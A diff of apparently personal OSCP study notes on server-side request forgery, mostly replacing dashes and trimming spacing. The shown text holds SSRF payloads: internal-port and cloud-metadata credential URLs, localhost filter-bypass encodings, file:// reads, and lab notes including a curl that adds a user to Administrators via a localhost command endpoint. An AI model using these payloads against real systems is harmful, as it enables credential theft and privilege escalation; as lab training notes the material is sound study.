@@ -20,7 +20,7 @@ http://127.0.0.1:8080
 http://127.0.0.1:6379
 ```
 
-Script it — iterate common ports and check response size/time differences.
+Script it - iterate common ports and check response size/time differences.
 
 ## Cloud Metadata (unlikely OSCP, good to know)
 
@@ -32,11 +32,11 @@ http://169.254.169.254/latest/meta-data/iam/security-credentials/
 ## Bypass Filters
 
 ```
-http://0x7f000001         (hex)
-http://2130706433         (decimal)
-http://127.1              (short form)
-http://0177.0.0.1         (octal)
-http://127.0.0.1.nip.io   (DNS rebinding)
+http://0x7f000001 (hex)
+http://2130706433 (decimal)
+http://127.1 (short form)
+http://0177.0.0.1 (octal)
+http://127.0.0.1.nip.io (DNS rebinding)
 http://[0:0:0:0:0:ffff:REDACTED]
 ```
 
@@ -57,12 +57,12 @@ file:///c:/windows/system32/drivers/etc/hosts
 
 ## From Your Boxes
 
-> **Love** (HTB) — SSRF via URL input box on staging subdomain to reach internal admin panel
+> **Love** (HTB) - SSRF via URL input box on staging subdomain to reach internal admin panel
 > - What worked: Entered `http://localhost:5000` into the URL scanner, which returned internal password dashboard creds
 > - Used creds (`admin:REDACTED!!!!`) to log into the voting admin panel and chain with file upload RCE
 > - Lesson: If a web app has a "URL scanner/checker" feature, immediately try localhost and internal ports
 
-> **Nickel** (PG/Windows) — Internal API command endpoint accessible only from localhost
+> **Nickel** (PG/Windows) - Internal API command endpoint accessible only from localhost
 > - What worked: `curl 'http://localhost:8080/?Add-LocalGroupMember%20-Group%20Administrators%20-Member%20ariah'`
 > - Discovered via PDF document mentioning "Temporary Command Endpoint" at `http://nickel/?`
 > - Lesson: Internal documentation/notes can reveal localhost-only endpoints. SSRF or local access turns these into RCE
